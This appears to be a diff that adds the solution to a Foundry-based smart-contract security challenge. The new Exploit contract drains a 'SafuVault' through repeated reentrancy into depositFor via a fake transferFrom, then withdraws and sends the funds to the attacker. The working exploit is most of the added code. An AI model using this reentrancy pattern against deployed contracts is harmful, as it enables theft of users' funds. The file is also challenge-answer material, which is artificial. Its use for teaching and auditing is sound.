@@ -66,6 +66,9 @@ contract Testing is Test {
         vm.startPrank(attacker,attacker);
 
         // implement solution here
+        Exploit ex = new Exploit(safuVault, usdc);
+        usdc.transfer(address(ex), 5_000 ether);
+        ex.attack();
 
         vm.stopPrank();
         validation();
@@ -81,4 +84,38 @@ contract Testing is Test {
 
     }
 
+}
+
+contract Exploit {
+
+    SafuVault vault;
+    uint256 depth;
+    address attacker;
+    Token usdc;
+
+    constructor(SafuVault _vault, Token _usdc) {
+        vault = _vault;
+        attacker = msg.sender;
+        usdc = _usdc;
+
+        usdc.approve(address(_vault), type(uint256).max);
+    }
+
+    function attack() external {
+        // entry point for reentrant calls to depositFor
+        vault.depositFor(address(this), 0, address(this));
+
+        // drain vault
+        vault.withdrawAll();
+        usdc.transfer(attacker, usdc.balanceOf(address(this)));
+    }
+
+    function transferFrom(address, address, uint256) external {
+        ++depth;
+        (depth == 15)
+            // break the whole call stack
+            ? vault.depositFor(address(usdc), usdc.balanceOf(address(this)), address(this))
+            // reenter vault
+            : vault.depositFor(address(this), 0, address(this));
+    }
 }
